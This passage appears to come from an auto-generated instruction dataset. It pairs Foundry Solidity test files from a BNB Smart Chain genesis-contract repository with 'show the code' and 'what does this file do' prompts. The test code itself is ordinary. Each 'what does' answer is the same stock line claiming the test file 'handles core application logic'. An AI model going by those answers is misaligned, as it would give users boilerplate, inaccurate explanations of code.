0xa6f79B60359f141df90A0C745125B131cAAfFD12;\n        cAddresses[11] = 0xe2d3A739EFFCd3A99387d015E260eEFAc72EBea1;\n        cAddresses[12] = 0x61Dd481A114A2E761c554B641742C973867899D3;\n        cAddresses[13] = 0xCc8E6d00C17eB431350C6c50d8b8F05176b90b11;\n        cAddresses[14] = 0xea0A6E3c511bbD10f4519EcE37Dc24887e11b55d;\n        cAddresses[15] = 0x2D4C407BBe49438ED859fe965b140dcF1aaB71a9;\n        cAddresses[16] = 0x685B1ded8013785d6623CC18D214320b6Bb64759;\n        cAddresses[17] = 0xD1d6bF74282782B0b3eb1413c901D6eCF02e8e28;\n        cAddresses[18] = 0x70F657164e5b75689b64B7fd1fA275F334f28e18;\n        cAddresses[19] = 0xBe807Dddb074639cD9fA61b47676c064fc50D62C;\n        cAddresses[20] = 0xb218C5D6aF1F979aC42BC68d98A5A0D796C6aB01;\n        cAddresses[21] = 0x9F8cCdaFCc39F3c7D6EBf637c9151673CBc36b88;\n        cAddresses[22] = 0xd93DbfB27e027F5e9e6Da52B9E1C413CE35ADC11;\n        cAddresses[23] = 0xce2FD7544e0B2Cc94692d4A704deBEf7bcB61328;\n        cAddresses[24] = 0x0BAC492386862aD3dF4B666Bc096b0505BB694Da;\n        cAddresses[25] = 0x733fdA7714a05960B7536330Be4DBB135bef0Ed6;\n        cAddresses[26] = 0x35EBb5849518aFF370cA25E19e1072cC1a9FAbCa;\n        cAddresses[27] = 0xeBE0B55aD7Bb78309180Cada12427d120fdBcc3a;\n        cAddresses[28] = 0x6488Aa4D1955Ee33403f8ccB1d4dE5Fb97C7ade2;\n        cAddresses[29] = 0x4396e28197653d0C244D95f8C1E57da902A72b4e;\n        cAddresses[30] = 0x702Be18040aA2a9b1af9219941469f1a435854fC;\n        cAddresses[31] = 0x12D810C13e42811E9907c02e02d1faD46cfA18BA;\n        cAddresses[32] = 0x2a7cdd959bFe8D9487B2a43B33565295a698F7e2;\n        cAddresses[33] = 0xB8f7166496996A7da21cF1f1b04d9B3E26a3d077;\n        cAddresses[34] = 0x9bB832254BAf4E8B4cc26bD2B52B31389B56E98B;\n        cAddresses[35] = 0x4430b3230294D12c6AB2aAC5C2cd68E80B16b581;\n        cAddresses[36] = 0xc2Be4EC20253B8642161bC3f444F53679c1F3D47;\n        cAddresses[37] = 0xEe01C3b1283AA067C58eaB4709F85e99D46de5FE;\n        cAddresses[38] = 0x9ef9f4360c606c7AB4db26b016007d3ad0aB86a0;\n        cAddresses[39] = 0x2f7bE8361C80A4c1e7e9aAF001d0877F1CFdE218;\n        cAddresses[40] = 0x35E7a025f4da968De7e4D7E4004197917F4070F1;\n        cAddresses[41] = 0xd6caA02BBebaEbB5d7e581e4B66559e635F805fF;\n        cAddresses[42] = 0x8c4D90829CE8F72D0163c1D5Cf348a862d550630;\n        cAddresses[43] = 0x68Bf0B8b6FB4E317a0f9D6F03eAF8CE6675BC60D;\n        cAddresses[44] = 0x82012708DAfC9E1B880fd083B32182B869bE8E09;\n        cAddresses[45] = 0x6BBad7Cf34b5fA511d8e963dbba288B1960E75D6;\n        cAddresses[46] = 0x22B81f8E175FFde54d797FE11eB03F9E3BF75F1d;\n        cAddresses[47] = 0x78f3aDfC719C99674c072166708589033e2d9afe;\n        cAddresses[48] = 0x29a97C6EfFB8A411DABc6aDEEfaa84f5067C8bbe;\n        cAddresses[49] = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;\n        cAddresses[50] = 0x2b3A6c089311b478Bf629C29D790A7A6db3fc1b9;\n        cAddresses[51] = 0xFE6E72b223f6d6Cf4edc6bFf92f30e84b8258249;\n        cAddresses[52] = 0xa6503279E8B5c7Bb5CF4deFD3ec8ABf3e009a80b;\n        cAddresses[53] = 0x4ee63a09170C3f2207aeCa56134Fc2Bee1b28e3C;\n        cAddresses[54] = 0xac0E15a038eedfc68ba3C35c73feD5bE4A07afB5;\n        cAddresses[55] = 0x69C77a677C40C7FBeA129d4b171a39B7A8DDaBfA;\n\n        vAddresses[0] =\n            hex\"977cf58294f7239d515e15b24cfeb82494056cf691eaf729b165f32c9757c429dba5051155903067e56ebe3698678e91\";\n        vAddresses[1] =\n            hex\"81db0422a5fd08e40db1fc2368d2245e4b18b1d0b85c921aaaafd2e341760e29fc613edd39f71254614e2055c3287a51\";\n        vAddresses[2] =\n            hex\"8a923564c6ffd37fb2fe9f118ef88092e8762c7addb526ab7eb1e772baef85181f892c731be0c1891a50e6b06262c816\";\n        vAddresses[3] =\n            hex\"b84f83ff2df44193496793b847f64e9d6db1b3953682bb95edd096eb1e69bbd357c200992ca78050d0cbe180cfaa018e\";\n        vAddresses[4] =\n            hex\"b0de8472be0308918c8bdb369bf5a67525210daffa053c52224c1d2ef4f5b38e4ecfcd06a1cc51c39c3a7dccfcb6b507\";\n        vAddresses[5] =\n            hex\"ae7bc6faa3f0cc3e6093b633fd7ee4f86970926958d0b7ec80437f936acf212b78f0cd095f4565fff144fd458d233a5b\";\n        vAddresses[6] =\n            hex\"84248a459464eec1a21e7fc7b71a053d9644e9bb8da4853b8f872cd7c1d6b324bf1922829830646ceadfb658d3de009a\";\n        vAddresses[7] =\n            hex\"a8a257074e82b881cfa06ef3eb4efeca060c2531359abd0eab8af1e3edfa2025fca464ac9c3fd123f6c24a0d78869485\";\n        vAddresses[8] =\n            hex\"98cbf822e4bc29f1701ac0350a3d042cd0756e9f74822c6481773ceb000641c51b870a996fe0f6a844510b1061f38cd0\";\n        vAddresses[9] =\n            hex\"b772e180fbf38a051c97dabc8aaa0126a233a9e828cdafcc7422c4bb1f4030a56ba364c54103f26bad91508b5220b741\";\n        vAddresses[10] =\n            hex\"956c470ddff48cb49300200b5f83497f3a3ccb3aeb83c5edd9818569038e61d197184f4aa6939ea5e9911e3e98ac6d21\";\n        vAddresses[11] =\n            hex\"8a80967d39e406a0a9642d41e9007a27fc1150a267d143a9f786cd2b5eecbdcc4036273705225b956d5e2f8f5eb95d25\";\n        vAddresses[12] =\n            hex\"b3a3d4feb825ae9702711566df5dbf38e82add4dd1b573b95d2466fa6501ccb81e9d26a352b96150ccbf7b697fd0a419\";\n        vAddresses[13] =\n            hex\"b2d4c6283c44a1c7bd503aaba7666e9f0c830e0ff016c1c750a5e48757a713d0836b1cabfd5c281b1de3b77d1c192183\";\n        vAddresses[14] =\n            hex\"93c1f7f6929d1fe2a17b4e14614ef9fc5bdc713d6631d675403fbeefac55611bf612700b1b65f4744861b80b0f7d6ab0\";\n        vAddresses[15] =\n            hex\"8a60f82a7bcf74b4cb053b9bfe83d0ed02a84ebb10865dfdd8e26e7535c43a1cccd268e860f502216b379dfc9971d358\";\n        vAddresses[16] =\n            hex\"939e8fb41b682372335be8070199ad3e8621d1743bcac4cc9d8f0f6e10f41e56461385c8eb5daac804fe3f2bca6ce739\";\n        vAddresses[17] =\n            hex\"96a26afa1295da81418593bd12814463d9f6e45c36a0e47eb4cd3e5b6af29c41e2a3a5636430155a466e216585af3ba7\";\n        vAddresses[18] =\n            hex\"b1f2c71577def3144fabeb75a8a1c8cb5b51d1d1b4a05eec67988b8685008baa17459ec425dbaebc852f496dc92196cd\";\n        vAddresses[19] =\n            hex\"b659ad0fbd9f515893fdd740b29ba0772dbde9b4635921dd91bd2963a0fc855e31f6338f45b211c4e9dedb7f2eb09de7\";\n        vAddresses[20] =\n            hex\"8819ec5ec3e97e1f03bbb4bb6055c7a5feac8f4f259df58349a32bb5cb377e2cb1f362b77f1dd398cfd3e9dba46138c3\";\n        vAddresses[21] =\n            hex\"b313f9cba57c63a84edb4079140e6dbd7829e5023c9532fce57e9fe602400a2953f4bf7dab66cca16e97be95d4de7044\";\n        vAddresses[22] =\n            hex\"b64abe25614c9cfd32e456b4d521f29c8357f4af4606978296c9be93494072ac05fa86e3d27cc8d66e65000f8ba33fbb\";\n        vAddresses[23] =\n            hex\"b0bec348681af766751cb839576e9c515a09c8bffa30a46296ccc56612490eb480d03bf948e10005bbcc0421f90b3d4e\";\n        vAddresses[24] =\n            hex\"b0245c33bc556cfeb013cd3643b30dbdef6df61a0be3ba00cae104b3c587083852e28f8911689c7033f7021a8a1774c9\";\n        vAddresses[25] =\n            hex\"a7f3e2c0b4b16ad183c473bafe30a36e39fa4a143657e229cd23c77f8fbc8e4e4e241695dd3d248d1e51521eee661914\";\n        vAddresses[26] =\n            hex\"8fdf49777b22f927d460fa3fcdd7f2ba0cf200634a3dfb5197d7359f2f88aaf496ef8c93a065de0f376d164ff2b6db9a\";\n        vAddresses[27] =\n            hex\"8ab17a9148339ef40aed8c177379c4db0bb5efc6f5c57a5d1a6b58b84d4b562e227196c79bda9a136830ed0c09f37813\";\n        vAddresses[28] =\n            hex\"8dd20979bd63c14df617a6939c3a334798149151577dd3f1fadb2bd1c1b496bf84c25c879da5f0f9dfdb88c6dd17b1e6\";\n        vAddresses[29] =\n            hex\"b679cbab0276ac30ff5f198e5e1dedf6b84959129f70fe7a07fcdf13444ba45b5dbaa7b1f650adf8b0acbecd04e2675b\";\n        vAddresses[30] =\n            hex\"8974616fe8ab950a3cded19b1d16ff49c97bf5af65154b3b097d5523eb213f3d35fc5c57e7276c7f2d83be87ebfdcdf9\";\n        vAddresses[31] =\n            hex\"ab764a39ff81dad720d5691b852898041a3842e09ecbac8025812d51b32223d8420e6ae51a01582220a10f7722de67c1\";\n        vAddresses[32] =\n            hex\"9025b6715c8eaabac0bfccdb2f25d651c9b69b0a184011a4a486b0b2080319d2396e7ca337f2abdf01548b2de1b3ba06\";\n        vAddresses[33] =\n            hex\"b2317f59d86abfaf690850223d90e9e7593d91a29331dfc2f84d5adecc75fc39ecab4632c1b4400a3dd1e1298835bcca\";\n\n        bytes memory cBz = abi.encode(cAddresses);\n        bytes memory vBz = abi.encode(vAddresses);\n        emit log_named_bytes(\"consensus address bytes\", cBz);\n        emit log_named_bytes(\"vote address bytes\", vBz);\n    }\n\n    function _encodeValidatorSetUpdatePack(\n        address[] memory valSet,\n        uint64[] memory votingPowers,\n        bytes[] memory voteAddrs\n    ) internal pure returns (bytes memory) {\n        bytes[] memory elements = new bytes[](2);\n        elements[0] = uint8(0).encodeUint();\n\n        bytes[] memory vals = new bytes[](valSet.length);\n        for (uint256 i; i < valSet.length; ++i) {\n            bytes[] memory tmp = new bytes[](5);\n            tmp[0] = valSet[i].encodeAddress();\n            tmp[1] = valSet[i].encodeAddress();\n            tmp[2] = valSet[i].encodeAddress();\n            tmp[3] = votingPowers[i].encodeUint();\n            tmp[4] = voteAddrs[i].encodeBytes();\n            vals[i] = tmp.encodeList();\n        }\n\n        elements[1] = vals.encodeList();\n        return elements.encodeList();\n    }\n\n    function testAgent() external {\n        // create validator\n        (address validator,,,) = _createValidator(2000 ether);\n        vm.startPrank(validator);\n\n        // edit failed because of `UpdateTooFrequently`\n        vm.expectRevert(StakeHub.UpdateTooFrequently.selector);\n        stakeHub.editConsensusAddress(address(1));\n\n        // update agent\n        address newAgent = validator;\n        vm.expectRevert(StakeHub.InvalidAgent.selector);\n        stakeHub.updateAgent(newAgent);\n\n        newAgent = address(0x1234);\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit AgentChanged(validator, address(0), newAgent);\n        stakeHub.updateAgent(newAgent);\n\n        vm.stopPrank();\n\n        vm.startPrank(newAgent);\n        // edit consensus address\n        vm.warp(block.timestamp + 1 days);\n        address newConsensusAddress = address(0x1234);\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit ConsensusAddressEdited(validator, newConsensusAddress);\n        stakeHub.editConsensusAddress(newConsensusAddress);\n        address realConsensusAddr = stakeHub.getValidatorConsensusAddress(validator);\n        assertEq(realConsensusAddr, newConsensusAddress);\n\n        // edit commission rate\n        vm.warp(block.timestamp + 1 days);\n        vm.expectRevert(StakeHub.InvalidCommission.selector);\n        stakeHub.editCommissionRate(110);\n        vm.expectRevert(StakeHub.InvalidCommission.selector);\n        stakeHub.editCommissionRate(16);\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit CommissionRateEdited(validator, 15);\n        stakeHub.editCommissionRate(15);\n        StakeHub.Commission memory realComm = stakeHub.getValidatorCommission(validator);\n        assertEq(realComm.rate, 15);\n\n        // edit description\n        vm.warp(block.timestamp + 1 days);\n        StakeHub.Description memory description = stakeHub.getValidatorDescription(validator);\n        description.moniker = \"Test\";\n        description.website = \"Test\";\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit DescriptionEdited(validator);\n        stakeHub.editDescription(description);\n        StakeHub.Description memory realDesc = stakeHub.getValidatorDescription(validator);\n        assertNotEq(realDesc.moniker, \"Test\"); // edit moniker will be ignored\n        assertEq(realDesc.website, \"Test\");\n\n        // edit vote address\n        vm.warp(block.timestamp + 1 days);\n        bytes memory newVoteAddress =\n            hex\"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234\";\n        bytes memory blsProof = new bytes(96);\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit VoteAddressEdited(validator, newVoteAddress);\n        stakeHub.editVoteAddress(newVoteAddress, blsProof);\n        bytes memory realVoteAddr = stakeHub.getValidatorVoteAddress(validator);\n        assertEq(realVoteAddr, newVoteAddress);\n\n        vm.stopPrank();\n    }\n\n    function testGetNodeIDs() public {\n         // Set maxNodeIDs through governance\n         uint256 currentMaxNodeIDs = stakeHub.maxNodeIDs();\n         if (currentMaxNodeIDs != 5) {\n             vm.prank(GOV_HUB_ADDR);\n             stakeHub.updateParam(\"maxNodeIDs\", abi.encode(uint256(5)));\n         }\n \n         // Create two validators\n         (address validator1,,,) = _createValidator(2000 ether);\n         (address validator2,,,) = _createValidator(2000 ether);\n \n         // Add NodeIDs to validator1\n         bytes32[] memory nodeIDs1 = new bytes32[](2);\n         nodeIDs1[0] = bytes32(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);\n         nodeIDs1[1] = bytes32(0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890);\n         vm.startPrank(validator1);\n         stakeHub.addNodeIDs(nodeIDs1);\n         vm.stopPrank();\n \n         // Add NodeIDs to validator2\n         bytes32[] memory nodeIDs2 = new bytes32[](2);\n         nodeIDs2[0] = bytes32(0x1111111111111111111111111111111111111111111111111111111111111111);\n         nodeIDs2[1] = bytes32(0x2222222222222222222222222222222222222222222222222222222222222222);\n         vm.startPrank(validator2);\n         stakeHub.addNodeIDs(nodeIDs2);\n         vm.stopPrank();\n \n         // Test getNodeIDs with both validators\n         address[] memory validatorsToQuery = new address[](2);\n         validatorsToQuery[0] = validator1;\n         validatorsToQuery[1] = validator2;\n \n         (address[] memory consensusAddresses, bytes32[][] memory result) = stakeHub.getNodeIDs(validatorsToQuery);\n         assertEq(result.length, 2, \"Should return results for both validators\");\n         assertEq(consensusAddresses.length, 2, \"Should return consensus addresses for both validators\");\n         assertEq(result[0].length, 2, \"Validator1 should have 2 NodeIDs\");\n         assertEq(result[1].length, 2, \"Validator2 should have 2 NodeIDs\");\n         assertEq(result[0][0], nodeIDs1[0], \"First NodeID of validator1 should match\");\n         assertEq(result[0][1], nodeIDs1[1], \"Second NodeID of validator1 should match\");\n         assertEq(result[1][0], nodeIDs2[0], \"First NodeID of validator2 should match\");\n         assertEq(result[1][1], nodeIDs2[1], \"Second NodeID of validator2 should match\");\n     }\n\n    function testRemoveNodeIDs() public {\n        // Set maxNodeIDs through governance\n        uint256 currentMaxNodeIDs = stakeHub.maxNodeIDs();\n        if (currentMaxNodeIDs != 5) {\n            vm.prank(GOV_HUB_ADDR);\n            stakeHub.updateParam(\"maxNodeIDs\", abi.encode(uint256(5)));\n        }\n\n        // Create a validator\n        (address validator,,,) = _createValidator(2000 ether);\n\n        // Add initial NodeIDs\n        bytes32[] memory initialNodeIDs = new bytes32[](3);\n        initialNodeIDs[0] = bytes32(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);\n        initialNodeIDs[1] = bytes32(0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890);\n        initialNodeIDs[2] = bytes32(0x1111111111111111111111111111111111111111111111111111111111111111);\n        vm.startPrank(validator);\n        stakeHub.addNodeIDs(initialNodeIDs);\n\n        // Remove some NodeIDs\n        bytes32[] memory nodeIDsToRemove = new bytes32[](2);\n        nodeIDsToRemove[0] = initialNodeIDs[0];\n        nodeIDsToRemove[1] = initialNodeIDs[2];\n\n        // Test event emissions\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDRemoved(validator, initialNodeIDs[0]);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDRemoved(validator, initialNodeIDs[2]);\n\n        stakeHub.removeNodeIDs(nodeIDsToRemove);\n\n        // Verify the removal\n        address[] memory validatorsToQuery = new address[](1);\n        validatorsToQuery[0] = validator;\n        (, bytes32[][] memory result) = stakeHub.getNodeIDs(validatorsToQuery);\n        \n        assertEq(result[0].length, 1, \"Should have 1 remaining NodeID\");\n        assertEq(result[0][0], initialNodeIDs[1], \"Remaining NodeID should match\");\n\n        // Test removing all NodeIDs\n        bytes32[] memory removeAll = new bytes32[](0);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDRemoved(validator, initialNodeIDs[1]);\n        stakeHub.removeNodeIDs(removeAll);\n\n        // Verify all NodeIDs are removed\n        (, result) = stakeHub.getNodeIDs(validatorsToQuery);\n        assertEq(result[0].length, 0, \"Should have no NodeIDs remaining\");\n    }\n\n    function testAddNodeIDs() public {\n        // Set maxNodeIDs through governance\n        uint256 currentMaxNodeIDs = stakeHub.maxNodeIDs();\n        if (currentMaxNodeIDs != 5) {\n            vm.prank(GOV_HUB_ADDR);\n            stakeHub.updateParam(\"maxNodeIDs\", abi.encode(uint256(5)));\n        }\n\n        // Create a validator\n        (address validator,,,) = _createValidator(2000 ether);\n\n        // Add initial NodeIDs to reach exactly 5\n        bytes32[] memory initialNodeIDs = new bytes32[](5);\n        initialNodeIDs[0] = bytes32(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);\n        initialNodeIDs[1] = bytes32(0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890);\n        initialNodeIDs[2] = bytes32(0x1111111111111111111111111111111111111111111111111111111111111111);\n        initialNodeIDs[3] = bytes32(0x2222222222222222222222222222222222222222222222222222222222222222);\n        initialNodeIDs[4] = bytes32(0x3333333333333333333333333333333333333333333333333333333333333333);\n\n        // Test event emissions\n        vm.startPrank(validator);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDAdded(validator, initialNodeIDs[0]);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDAdded(validator, initialNodeIDs[1]);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDAdded(validator, initialNodeIDs[2]);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDAdded(validator, initialNodeIDs[3]);\n        vm.expectEmit(true, true, false, false);\n        emit NodeIDAdded(validator, initialNodeIDs[4]);\n\n        stakeHub.addNodeIDs(initialNodeIDs);\n\n        // Verify the addition\n        address[] memory validatorsToQuery = new address[](1);\n        validatorsToQuery[0] = validator;\n        (, bytes32[][] memory result) = stakeHub.getNodeIDs(validatorsToQuery);\n        \n        assertEq(result[0].length, 5, \"Should have 5 NodeIDs\");\n        assertEq(result[0][0], initialNodeIDs[0], \"First NodeID should match\");\n        assertEq(result[0][1], initialNodeIDs[1], \"Second NodeID should match\");\n        assertEq(result[0][2], initialNodeIDs[2], \"Third NodeID should match\");\n        assertEq(result[0][3], initialNodeIDs[3], \"Fourth NodeID should match\");\n        assertEq(result[0][4], initialNodeIDs[4], \"Fifth NodeID should match\");\n\n        // Test error cases\n        // Test with too many NodeIDs - use unique NodeIDs to avoid DuplicateNodeID error\n        bytes32[] memory tooManyNodeIDs = new bytes32[](1);\n        tooManyNodeIDs[0] = bytes32(0x4444444444444444444444444444444444444444444444444444444444444444);\n        vm.expectRevert(ExceedsMaxNodeIDs.selector);\n        stakeHub.addNodeIDs(tooManyNodeIDs);\n    }\n}\n\n```"}
{"instruction": "What does the file StakeHub.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/console.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport \"./utils/Deployer.sol\";\n\ninterface IStakeCredit {\n    function balanceOf(address account) external view returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n}\n\ncontract StakeHubTest is Deployer {\n    using RLPEncode for *;\n\n    // Add NodeID related events and errors\n    event NodeIDAdded(address indexed validator, bytes32 nodeID);\n    event NodeIDRemoved(address indexed validator, bytes32 nodeID);\n    \n    error ExceedsMaxNodeIDs();\n    error DuplicateNodeID();\n    error InvalidNodeID();\n\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newAddress);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 commissionRate);\n    event DescriptionEdited(address indexed operatorAddress);\n    event VoteAddressEdited(address indexed operatorAddress, bytes newVoteAddress);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n    event ValidatorUnjailed(address indexed operatorAddress);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n    event MigrateSuccess(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event MigrateFailed(\n        address indexed operatorAddress, address indexed delegator, uint256 bnbAmount, StakeMigrationRespCode respCode\n    );\n    event AgentChanged(address indexed operatorAddress, address indexed oldAgent, address indexed newAgent);\n\n    enum StakeMigrationRespCode {\n        MIGRATE_SUCCESS,\n```", "output": "This file `StakeHub.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SystemReward.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\SystemReward.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract SystemRewardTest is Deployer {\n    event rewardTo(address indexed to, uint256 amount);\n    event rewardEmpty();\n\n    function setUp() public { }\n\n    function testReceive(uint256 amount) public {\n        vm.assume(amount < 1e20);\n        uint256 balance = address(systemReward).balance;\n\n        payable(address(systemReward)).transfer(amount);\n        assertEq(address(systemReward).balance, amount + balance);\n    }\n\n    function testOperator() public {\n        assertTrue(systemReward.isOperator(LIGHT_CLIENT_ADDR), \"light client should be operator\");\n        assertTrue(systemReward.isOperator(INCENTIVIZE_ADDR), \"relayer incentivize should be operator\");\n        assertTrue(!systemReward.isOperator(_getNextUserAddress()), \"address should not be operator\");\n    }\n\n    function testClaimReward() public {\n        address payable newAccount = _getNextUserAddress();\n\n        payable(address(systemReward)).transfer(1 ether);\n        vm.expectEmit(true, false, false, true, address(systemReward));\n        emit rewardTo(newAccount, 1 ether);\n        vm.prank(LIGHT_CLIENT_ADDR);\n        systemReward.claimRewards(newAccount, 1 ether);\n\n        vm.expectRevert(\"only operator is allowed to call the method\");\n        systemReward.claimRewards(newAccount, 1 ether);\n\n        vm.deal(address(systemReward), 0);\n        vm.expectEmit(false, false, false, false, address(systemReward));\n        emit rewardEmpty();\n        vm.prank(LIGHT_CLIENT_ADDR);\n        systemReward.claimRewards(newAccount, 1 ether);\n    }\n\n    function testGov() public {\n        bytes memory key = \"addOperator\";\n        bytes memory valueBytes = abi.encodePacked(address(bscValidatorSet));\n        vm.expectEmit(false, false, false, true, address(systemReward));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(systemReward));\n        assertTrue(systemReward.isOperator(address(bscValidatorSet)));\n\n        key = \"deleteOperator\";\n        vm.expectEmit(false, false, false, true, address(systemReward));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(systemReward));\n        assertFalse(systemReward.isOperator(address(bscValidatorSet)));\n    }\n}\n\n```"}
{"instruction": "What does the file SystemReward.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract SystemRewardTest is Deployer {\n    event rewardTo(address indexed to, uint256 amount);\n    event rewardEmpty();\n\n    function setUp() public { }\n\n    function testReceive(uint256 amount) public {\n        vm.assume(amount < 1e20);\n        uint256 balance = address(systemReward).balance;\n\n        payable(address(systemReward)).transfer(amount);\n        assertEq(address(systemReward).balance, amount + balance);\n    }\n\n    function testOperator() public {\n        assertTrue(systemReward.isOperator(LIGHT_CLIENT_ADDR), \"light client should be operator\");\n        assertTrue(systemReward.isOperator(INCENTIVIZE_ADDR), \"relayer incentivize should be operator\");\n        assertTrue(!systemReward.isOperator(_getNextUserAddress()), \"address should not be operator\");\n    }\n\n    function testClaimReward() public {\n        address payable newAccount = _getNextUserAddress();\n\n        payable(address(systemReward)).transfer(1 ether);\n        vm.expectEmit(true, false, false, true, address(systemReward));\n        emit rewardTo(newAccount, 1 ether);\n        vm.prank(LIGHT_CLIENT_ADDR);\n        systemReward.claimRewards(newAccount, 1 ether);\n\n        vm.expectRevert(\"only operator is allowed to call the method\");\n        systemReward.claimRewards(newAccount, 1 ether);\n\n        vm.deal(address(systemReward), 0);\n        vm.expectEmit(false, false, false, false, address(systemReward));\n        emit rewardEmpty();\n        vm.prank(LIGHT_CLIENT_ADDR);\n        systemReward.claimRewards(newAccount, 1 ether);\n    }\n\n    function testGov() public {\n        bytes memory key = \"addOperator\";\n        bytes memory valueBytes = abi.encodePacked(address(bscValidatorSet));\n        vm.expectEmit(false, false, false, true, address(systemReward));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(systemReward));\n        assertTrue(systemReward.isOperator(address(bscValidatorSet)));\n\n  \n```", "output": "This file `SystemReward.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TendermintLightClient.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\TendermintLightClient.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract TendermintLightClientTest is Deployer {\n    uint256 public requiredDeposit;\n    uint256 public dues;\n\n    function setUp() public { }\n\n    function testInitConsensusState() public {\n        assertEq(lightClient.initialHeight(), 110186855);\n        assertEq(lightClient.chainID(), bytes32(\"Binance-Chain-Tigris\"));\n        assertTrue(lightClient.isHeaderSynced(uint64(255787329)));\n        assertTrue(!lightClient.isHeaderSynced(uint64(255787330)));\n    }\n}\n\n```"}
{"instruction": "What does the file TendermintLightClient.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract TendermintLightClientTest is Deployer {\n    uint256 public requiredDeposit;\n    uint256 public dues;\n\n    function setUp() public { }\n\n    function testInitConsensusState() public {\n        assertEq(lightClient.initialHeight(), 110186855);\n        assertEq(lightClient.chainID(), bytes32(\"Binance-Chain-Tigris\"));\n        assertTrue(lightClient.isHeaderSynced(uint64(255787329)));\n        assertTrue(!lightClient.isHeaderSynced(uint64(255787330)));\n    }\n}\n\n```", "output": "This file `TendermintLightClient.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TokenRecoverPortal.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\TokenRecoverPortal.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ninterface ITokenRecoverPortal {\n    // Returns the merkle root of the merkle tree containing account balances available to recover.\n    function merkleRoot() external view returns (bytes32);\n    // Returns the address of the contract that is allowed to confirm the recover.\n    function approvalAddress() external view returns (address);\n    // Returns the address of the contract that is allowed to pause the recover.\n    function assetProtector() external view returns (address);\n    // Returns true if the index has been marked recovered.\n    function isRecovered(bytes32 index) external view returns (bool);\n    // recover the given amount of the token to the given address. Reverts if the inputs are invalid.\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n    // Cancel the user token recover request by the assetProtector.\n    function cancelTokenRecover(bytes32 tokenSymbol, address recipient) external;\n}\n\ncontract TokenRecoverPortalTest is Deployer {\n    using RLPEncode for *;\n\n    receive() external payable { }\n\n    address mockUser = address(0x2e9247B67ae885a8dcfBf77Eb6d0e93A32bea24C);\n    bytes mockTokenOwner = hex\"b713200f29effb427fb76a185b4ac73ea09a534b\";\n    bytes32 testTokenSymbol = hex\"424e420000000000000000000000000000000000000000000000000000000000\";\n\n    address protector = address(0x5C7c4b3ee76D1eD8a4341Ab07D87a2a88d81454A);\n    address approvalAddress = address(0xb26859a7321AB7B2025E5E6a425D697e2eacbFB1);\n    bytes merkleRoot = hex\"59bb94f7047904a8fdaec42e4785295167f7fd63742b309afeb84bd71f8e6554\";\n\n    function setUp() public {\n        vm.mockCall(address(0x69), bytes(\"\"), mockTokenOwner);\n        // slot id for `merkleRootAlreadyInit`\n        bytes32 slot = bytes32(uint256(105));\n\n        // change `merkleRootAlreadyInit` to false\n        vm.store(address(tokenRecoverPortal), slot, bytes32(uint256(0)));\n\n        // check `merkleRootAlreadyInit` is false\n        assertEq(tokenRecoverPortal.merkleRootAlreadyInit(), false);\n    }\n\n    function setUpContractParams(\n        address newApprovalAddress,\n        bytes memory newMerkleRoot,\n        address newProtector\n    ) internal {\n        // set the approvalAddress, merkleRoot and tokenRecoverPortalProtector\n        bytes memory key = \"approvalAddress\";\n        bytes memory value = abi.encodePacked(newApprovalAddress);\n        